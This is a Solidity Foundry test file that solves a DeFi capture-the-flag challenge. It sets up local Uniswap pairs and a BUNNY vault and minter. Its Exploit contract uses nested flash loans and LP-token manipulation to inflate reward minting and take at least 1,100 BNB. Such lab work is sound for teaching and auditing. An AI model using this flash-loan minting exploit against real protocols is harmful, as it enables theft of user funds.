// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IWETH} from "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import {Token} from "src/other/Token.sol";
import {AutoCompoundVault} from "src/fatality/AutoCompoundVault.sol";
import {BunnyMinter} from "src/fatality/BunnyMinter.sol";
import {ZapBSC} from "src/fatality/ZapBSC.sol";


contract Testing is Test {

    address attacker = makeAddr('attacker');
    address o1 = makeAddr('o1');
    address o2 = makeAddr('o2');
    address admin = makeAddr('admin'); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used

    IUniswapV2Factory uniFactory;
    IUniswapV2Router02 uniRouter;
    IUniswapV2Pair usdcBnbPair;
    IUniswapV2Pair bnbBunnyPair;
    IWETH weth;
    Token usdc;
    Token dai;
    Token bunny;
    Token bnb;
    AutoCompoundVault vault;
    BunnyMinter bunnyMinter;
    ZapBSC zapBSC;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying token contracts
        vm.prank(admin);
        usdc = new Token('USDC','USDC');
        vm.prank(admin);
        usdc.mint(admin,1_900_000e18);

        vm.prank(admin);
        dai = new Token('DAI','DAI');
        vm.prank(admin);
        dai.mint(admin,1_900_000e18);

        vm.prank(admin);
        bunny = new Token('BUNNY','BUNNY');
        vm.prank(admin);
        bunny.mint(admin,9_000e18);

        vm.prank(admin);
        bnb = new Token('BNB','BNB');
        vm.prank(admin);
        bnb.mint(admin,9_000e18);

        // deploying uniswap contracts
        weth = IWETH(
            deployCode("src/other/uniswap-build/WETH9.json")
        );
        uniFactory = IUniswapV2Factory(
            deployCode(
                "src/other/uniswap-build/UniswapV2Factory.json",
                abi.encode(admin)
            )
        );
        uniRouter = IUniswapV2Router02(
            deployCode(
                "src/other/uniswap-build/UniswapV2Router02.json",
                abi.encode(address(uniFactory),address(weth))
            )
        );

        // --adding initial liquidity for pairs
        vm.startPrank(admin);
        usdc.approve(address(uniRouter),type(uint).max);
        dai.approve(address(uniRouter),type(uint).max);
        bunny.approve(address(uniRouter),type(uint).max);
        bnb.approve(address(uniRouter),type(uint).max);
        vm.stopPrank();

        vm.prank(admin);
        uniRouter.addLiquidity( // USDC-DAI pair
            address(usdc),address(dai),
            1_000_000e18,1_000_000e18,
            0,0,
            admin,block.timestamp
        );

        vm.prank(admin);
        uniRouter.addLiquidity( // USDC-BNB pair
            address(usdc),address(bnb),
            900_000e18,3_000e18,
            0,0,
            admin,block.timestamp
        );

        vm.prank(admin);
        uniRouter.addLiquidity( // DAI-BNB pair
            address(dai),address(bnb),
            900_000e18,3_000e18,
            0,0,
            admin,block.timestamp
        );

        vm.prank(admin);
        uniRouter.addLiquidity( // BUNNY-BNB pair
            address(bunny),address(bnb),
            9_000e18,3_000e18, // 3x BUNNY per 1x BNB
            0,0,
            admin,block.timestamp
        );

        usdcBnbPair = IUniswapV2Pair(uniFactory.getPair(address(usdc),address(bnb)));
        bnbBunnyPair = IUniswapV2Pair(uniFactory.getPair(address(bnb),address(bunny)));

        // deploying core contracts
        vm.prank(admin);
        zapBSC = new ZapBSC(address(uniRouter),address(bnb),address(usdc),address(bunny));

        vm.prank(admin);
        bunnyMinter = new BunnyMinter(
            address(zapBSC),
            address(uniRouter),
            address(bnb),
            address(bunny),
            address(bnbBunnyPair)
        );

        vault = new AutoCompoundVault(address(usdcBnbPair),address(bunnyMinter));

        vm.prank(admin);
        zapBSC.setMinter(address(bunnyMinter));
        vm.prank(admin);
        bunnyMinter.setMinter(address(vault));
        vm.prank(admin);
        bunny.transferOwnership(address(bunnyMinter));

    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker,attacker);

        // implement solution here
        Exploit exploit = new Exploit(address(uniFactory), address(uniRouter), address(usdcBnbPair), address(bnbBunnyPair), address(usdc), address(dai), address(bunny), address(bnb),  address(vault),  address(bunnyMinter), address(zapBSC));
        exploit.pwn();
        //vm.stopPrank();

        /*vm.roll(block.number+1);
        vm.startPrank(attacker,attacker);
        exploit.pwn();*/

        //Exploit _exploit = new Exploit(address(uniFactory), address(uniRouter), address(usdcBnbPair), address(bnbBunnyPair), address(usdc), address(dai), address(bunny), address(bnb),  address(vault),  address(bunnyMinter), address(zapBSC));
        //_exploit.pwn();

        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {

        // attacker steals at least 1100 BNB - only allowed 2 blocks to run exploit
        assertGe(bnb.balanceOf(attacker),1_100e18);

    }

}

contract Exploit {

    address owner;
    IUniswapV2Factory uniFactory;
    IUniswapV2Router02 uniRouter;
    IUniswapV2Pair usdcBnbPair;
    IUniswapV2Pair bnbBunnyPair;
    IUniswapV2Pair usdcDaiPair;
    IUniswapV2Pair daiBnbPair;
    IWETH weth;
    Token usdc;
    Token dai;
    Token bunny;
    Token bnb;
    AutoCompoundVault vault;
    BunnyMinter bunnyMinter;
    ZapBSC zapBSC;
    bool firstFlashLoan;
    bool secondFlashLoan;
    uint256 repayUSDC;
    uint256 repayBNB;

    constructor(address _uniFactory, address _uniRouter, address _usdcBnbPair, address _bnbBunnyPair, address _usdc, address _dai, address _bunny, address _bnb,  address _vault,  address _bunnyMinter, address _zapBSC){
        owner= msg.sender;
        uniFactory = IUniswapV2Factory(_uniFactory);
        uniRouter = IUniswapV2Router02(_uniRouter);
        usdcBnbPair = IUniswapV2Pair(_usdcBnbPair);
        bnbBunnyPair = IUniswapV2Pair(_bnbBunnyPair);
        usdc = Token(_usdc);
        dai = Token(_dai);    
        bunny = Token(_bunny);
        bnb  = Token(_bnb);
        usdcDaiPair = IUniswapV2Pair(uniFactory.getPair(address(usdc),address(dai)));
        daiBnbPair = IUniswapV2Pair(uniFactory.getPair(address(dai),address(bnb)));
        vault = AutoCompoundVault(_vault);
        bunnyMinter = BunnyMinter(_bunnyMinter);
        zapBSC = ZapBSC(_zapBSC);
        usdc.approve(address(uniRouter),type(uint).max);
        bnb.approve(address(uniRouter),type(uint).max);
        bunny.approve(address(uniRouter),type(uint).max);
        usdcBnbPair.approve(address(uniRouter),type(uint).max);
        usdcBnbPair.approve(address(vault),type(uint).max);

    }

    function uniswapV2Call(address _address,uint amount0Out,uint amount1Out, bytes memory data) external {
        //console.log("test");
        
        if(!firstFlashLoan){
            firstFlashLoan = true;
            repayUSDC = (amount0Out * 103 /100)+1;
            daiBnbPair.swap(2_999e18,0,address(this), new bytes(1));
        }

        if(!secondFlashLoan){
            //secondFlashLoan = true;
            repayBNB = (amount0Out * 103 /100)+1;
            console.log("test");
            uniRouter.addLiquidity(
            address(usdc),address(bnb),
            usdc.balanceOf(address(this)),
            bnb.balanceOf(address(this)),
            0,0,
            address(this),block.timestamp);

            //console.log("test");
            vault.deposit(1e18);
            usdcBnbPair.transfer(address(usdcBnbPair),usdcBnbPair.balanceOf(address(this)));

            
            
            //console.log("test");
            vault.withdrawAllAndEarn();
            
            //hope to have enough bunny for repay all flash loans
            address[] memory path = new address[](2);
            path[0] = address(bunny);
            path[1] = address(bnb);
            //console.log("test");
            uniRouter.swapExactTokensForTokens(
                bunny.balanceOf(address(this)), 
                0, path, address(this), block.timestamp
            );

            path[0] = address(bnb);
            path[1] = address(usdc);
            //console.log("test");
            uniRouter.swapTokensForExactTokens(
                repayUSDC,
                type(uint256).max, path, address(this), block.timestamp
            );

            //console.log("test");
            uniRouter.removeLiquidity(
            address(usdc),address(bnb),
            usdcBnbPair.balanceOf(address(this)),
            0,0,
            address(this),block.timestamp);

            
            //console.log("test");
            usdc.transfer(address(usdcDaiPair),repayUSDC);
            

            path[0] = address(usdc);
            path[1] = address(bnb);
            //console.log("test");
            uniRouter.swapExactTokensForTokens(
                usdc.balanceOf(address(this)), 
                0, path, address(this), block.timestamp
            );
            //console.log("test");
            bnb.transfer(address(daiBnbPair),repayBNB);
            //console.log("test");
            bnb.transfer(owner,bnb.balanceOf(address(this)));
            firstFlashLoan=false;
            secondFlashLoan = true;
        }
    }
    function pwn() external returns (address){
        //console.log("test");
        //console.log(usdcDaiPair);
        //console.log("daiBnbPair : ",daiBnbPair);
        usdcDaiPair.swap(900_000e18,0,address(this), new bytes(1));
    }

}